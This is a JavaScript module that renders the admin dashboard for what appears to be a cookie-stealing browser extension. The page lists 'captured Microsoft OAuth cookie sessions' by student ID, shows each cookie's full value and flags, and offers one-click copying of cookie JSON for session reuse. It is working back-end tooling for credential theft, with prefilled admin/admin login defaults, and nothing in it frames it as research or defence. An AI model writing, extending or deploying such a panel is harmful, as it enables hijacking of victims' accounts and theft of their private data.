"use strict";

function renderAdminPanelPage() {
    return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>UCP Cookie Admin</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: Inter, -apple-system, BlinkMacSystemFont, sans-serif;
      background: #0b1020;
      color: #e8ecf8;
      min-height: 100vh;
    }
    .wrap { max-width: 1200px; margin: 0 auto; padding: 24px; }
    .card {
      background: rgba(255,255,255,0.04);
      border: 1px solid rgba(255,255,255,0.08);
      border-radius: 16px;
      padding: 24px;
      backdrop-filter: blur(8px);
    }
    h1 { font-size: 1.5rem; margin-bottom: 8px; }
    .muted { color: #9aa7c7; font-size: 0.9rem; }
    .row { display: flex; gap: 12px; flex-wrap: wrap; align-items: center; }
    .hidden { display: none !important; }
    label { display: block; font-size: 0.85rem; color: #b8c2de; margin-bottom: 6px; }
    input {
      width: 100%;
      background: #121a31;
      border: 1px solid #2a3558;
      color: #fff;
      border-radius: 10px;
      padding: 12px 14px;
      font-size: 0.95rem;
    }
    .field { flex: 1; min-width: 220px; margin-bottom: 14px; }
    button, .btn {
      border: 0;
      border-radius: 10px;
      padding: 10px 14px;
      font-weight: 600;
      cursor: pointer;
      font-size: 0.9rem;
    }
    .btn-primary { background: #5b6cff; color: #fff; }
    .btn-secondary { background: #1b2442; color: #dbe4ff; border: 1px solid #33406d; }
    .btn-danger { background: #8f2f4f; color: #fff; }
    .toolbar { margin: 18px 0; justify-content: space-between; }
    table { width: 100%; border-collapse: collapse; margin-top: 12px; font-size: 0.88rem; }
    th, td { text-align: left; padding: 10px 8px; border-bottom: 1px solid rgba(255,255,255,0.08); vertical-align: top; }
    th { color: #9fb0d9; font-weight: 600; }
    tr:hover td { background: rgba(255,255,255,0.02); }
    .badge {
      display: inline-block;
      padding: 3px 8px;
      border-radius: 999px;
      font-size: 0.75rem;
      font-weight: 600;
    }
    .badge-start { background: #2f3f7a; color: #b7c7ff; }
    .badge-complete { background: #1f5d45; color: #b4f5d5; }
    .pill { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 0.78rem; color: #c6d4ff; }
    .error { color: #ff9db1; margin-top: 10px; min-height: 20px; }
    .detail-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 12px; margin: 16px 0; }
    .detail-item { background: #11182d; border: 1px solid #273154; border-radius: 10px; padding: 12px; }
    .detail-item strong { display: block; color: #9fb0d9; font-size: 0.75rem; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.04em; }
    pre {
      background: #0a1124;
      border: 1px solid #273154;
      border-radius: 12px;
      padding: 14px;
      overflow: auto;
      max-height: 360px;
      font-size: 0.78rem;
      line-height: 1.45;
      white-space: pre-wrap;
      word-break: break-all;
    }
    .cookie-table td:nth-child(2), .cookie-table td:nth-child(3) {
      font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
      font-size: 0.76rem;
      max-width: 280px;
      word-break: break-all;
    }
    .toast {
      position: fixed;
      right: 20px;
      bottom: 20px;
      background: #1f6f4e;
      color: #eafff4;
      padding: 10px 14px;
      border-radius: 10px;
      opacity: 0;
      transform: translateY(8px);
      transition: all 0.2s ease;
      pointer-events: none;
      z-index: 20;
    }
    .toast.show { opacity: 1; transform: translateY(0); }
  </style>
</head>
<body>
  <div class="wrap">
    <section id="loginView" class="card" style="max-width:480px;margin:80px auto;">
      <h1>Cookie Admin Panel</h1>
      <p class="muted" style="margin:8px 0 18px;">Sign in to view captured Microsoft OAuth cookie sessions.</p>
      <div class="field"><label>Username</label><input id="username" value="admin" autocomplete="username" /></div>
      <div class="field"><label>Password</label><input id="password" type="password" value="admin" autocomplete="current-password" /></div>
      <button class="btn-primary" id="loginBtn">Sign In</button>
      <div class="error" id="loginError"></div>
    </section>

    <section id="dashboardView" class="hidden">
      <div class="card">
        <div class="row toolbar">
          <div>
            <h1>Cookie Sessions</h1>
            <p class="muted">Captured logins from the extension, newest first.</p>
          </div>
          <div class="row">
            <button class="btn-secondary" id="refreshBtn">Refresh</button>
            <button class="btn-danger" id="logoutBtn">Logout</button>
          </div>
        </div>
        <table>
          <thead>
            <tr>
              <th>Captured</th>
              <th>Phase</th>
              <th>Student</th>
              <th>Cookies</th>
              <th>Domains</th>
              <th>Action</th>
            </tr>
          </thead>
          <tbody id="sessionsBody"></tbody>
        </table>
      </div>

      <div id="detailView" class="card hidden" style="margin-top:18px;">
        <div class="row toolbar">
          <div>
            <h1>Session Detail</h1>
            <p class="muted" id="detailSubtitle"></p>
          </div>
          <div class="row">
            <button class="btn-secondary" id="copyCookiesBtn">Copy Cookies JSON</button>
            <button class="btn-secondary" id="copyFullBtn">Copy Full Session JSON</button>
            <button class="btn-secondary" id="closeDetailBtn">Close</button>
          </div>
        </div>
        <div class="detail-grid" id="detailMeta"></div>
        <h3 style="margin:8px 0 10px;font-size:0.95rem;">Cookie Table</h3>
        <table class="cookie-table">
          <thead><tr><th>Name</th><th>Value</th><th>Domain</th><th>Path</th><th>Flags</th></tr></thead>
          <tbody id="cookieBody"></tbody>
        </table>
        <h3 style="margin:18px 0 10px;font-size:0.95rem;">JSON Preview</h3>
        <pre id="jsonPreview"></pre>
      </div>
    </section>
  </div>
  <div class="toast" id="toast">Copied to clipboard</div>

  <script>
    const TOKEN_KEY = "ucp_admin_token";
    let currentSession = null;

    function getToken() { return localStorage.getItem(TOKEN_KEY) || ""; }
    function setToken(token) { localStorage.setItem(TOKEN_KEY, token); }
    function clearToken() { localStorage.removeItem(TOKEN_KEY); }

    function showToast(msg) {
      const el = document.getElementById("toast");
      el.textContent = msg;
      el.classList.add("show");
      setTimeout(() => el.classList.remove("show"), 1800);
    }

    async function api(path, options) {
      const opts = options || {};
      const headers = Object.assign({ "Content-Type": "application/json" }, opts.headers || {});
      const token = getToken();
      if (token) headers.Authorization = "Bearer " + token;
      const res = await fetch(path, Object.assign({}, opts, { headers }));
      if (res.status === 401) {
        clearToken();
        showLogin();
        throw new Error("Session expired");
      }
      const data = await res.json().catch(() => ({}));
      if (!res.ok) throw new Error(data.error || "Request failed");
      return data;
    }

    function showLogin() {
      document.getElementById("loginView").classList.remove("hidden");
      document.getElementById("dashboardView").classList.add("hidden");
    }

    function showDashboard() {
      document.getElementById("loginView").classList.add("hidden");
      document.getElementById("dashboardView").classList.remove("hidden");
    }

    function phaseBadge(phase) {
      const cls = phase === "oauth_complete" ? "badge-complete" : "badge-start";
      return '<span class="badge ' + cls + '">' + phase + '</span>';
    }

    function formatDate(value) {
      if (!value) return "-";
      return new Date(value).toLocaleString();
    }

    async function loadSessions() {
      const data = await api("/admin/api/sessions?limit=50");
      const body = document.getElementById("sessionsBody");
      if (!data.items.length) {
        body.innerHTML = '<tr><td colspan="6" class="muted">No cookie sessions yet.</td></tr>';
        return;
      }
      body.innerHTML = data.items.map(function (item) {
        const domains = (item.domains || []).slice(0, 2).join(", ");
        const more = (item.domains || []).length > 2 ? "..." : "";
        return '<tr>' +
          '<td>' + formatDate(item.capturedAt) + '</td>' +
          '<td>' + phaseBadge(item.phase) + '</td>' +
          '<td class="pill">' + (item.studentId || "—") + '</td>' +
          '<td>' + (item.cookieCount || 0) + '</td>' +
          '<td class="muted">' + domains + more + '</td>' +
          '<td><button class="btn-secondary" data-id="' + item._id + '">View</button></td>' +
        '</tr>';
      }).join("");

      body.querySelectorAll("button[data-id]").forEach(function (btn) {
        btn.addEventListener("click", function () {
          openDetail(btn.getAttribute("data-id"));
        });
      });
    }

    function renderDetail(session, exportData) {
      currentSession = exportData;
      document.getElementById("detailView").classList.remove("hidden");
      document.getElementById("detailSubtitle").textContent = session.sessionId;
      document.getElementById("detailMeta").innerHTML =
        '<div class="detail-item"><strong>Phase</strong>' + session.phase + '</div>' +
        '<div class="detail-item"><strong>Student ID</strong>' + (session.studentId || "—") + '</div>' +
        '<div class="detail-item"><strong>Cookie Count</strong>' + (session.cookieCount || 0) + '</div>' +
        '<div class="detail-item"><strong>Captured At</strong>' + formatDate(session.capturedAt) + '</div>' +
        '<div class="detail-item"><strong>Trigger URL</strong><span class="pill">' + session.triggerUrl + '</span></div>';

      const cookieBody = document.getElementById("cookieBody");
      cookieBody.innerHTML = (session.cookies || []).map(function (c) {
        const flags = [
          c.secure ? "secure" : "",
          c.httpOnly ? "httpOnly" : "",
          c.sameSite || ""
        ].filter(Boolean).join(", ");
        return '<tr><td>' + c.name + '</td><td>' + c.value + '</td><td>' + c.domain + '</td><td>' + (c.path || "/") + '</td><td class="muted">' + flags + '</td></tr>';
      }).join("");

      document.getElementById("jsonPreview").textContent = JSON.stringify(exportData, null, 2);
    }

    async function openDetail(id) {
      const data = await api("/admin/api/sessions/" + id);
      renderDetail(data.session, data.export);
    }

    async function copyText(text, label) {
      await navigator.clipboard.writeText(text);
      showToast(label + " copied");
    }

    document.getElementById("loginBtn").addEventListener("click", async function () {
      const err = document.getElementById("loginError");
      err.textContent = "";
      try {
        const result = await api("/admin/api/login", {
          method: "POST",
          body: JSON.stringify({
            username: document.getElementById("username").value,
            password: document.getElementById("password").value
          })
        });
        setToken(result.token);
        showDashboard();
        await loadSessions();
      } catch (e) {
        err.textContent = e.message || "Login failed";
      }
    });

    document.getElementById("logoutBtn").addEventListener("click", async function () {
      try { await api("/admin/api/logout", { method: "POST" }); } catch (e) {}
      clearToken();
      showLogin();
    });

    document.getElementById("refreshBtn").addEventListener("click", loadSessions);
    document.getElementById("closeDetailBtn").addEventListener("click", function () {
      document.getElementById("detailView").classList.add("hidden");
      currentSession = null;
    });
    document.getElementById("copyCookiesBtn").addEventListener("click", function () {
      if (!currentSession) return;
      copyText(JSON.stringify(currentSession.cookies || [], null, 2), "Cookies JSON");
    });
    document.getElementById("copyFullBtn").addEventListener("click", function () {
      if (!currentSession) return;
      copyText(JSON.stringify(currentSession, null, 2), "Full session JSON");
    });

    (async function init() {
      if (!getToken()) return showLogin();
      try {
        showDashboard();
        await loadSessions();
      } catch (e) {
        showLogin();
      }
    })();
  </script>
</body>
</html>`;
}

module.exports = { renderAdminPanelPage };
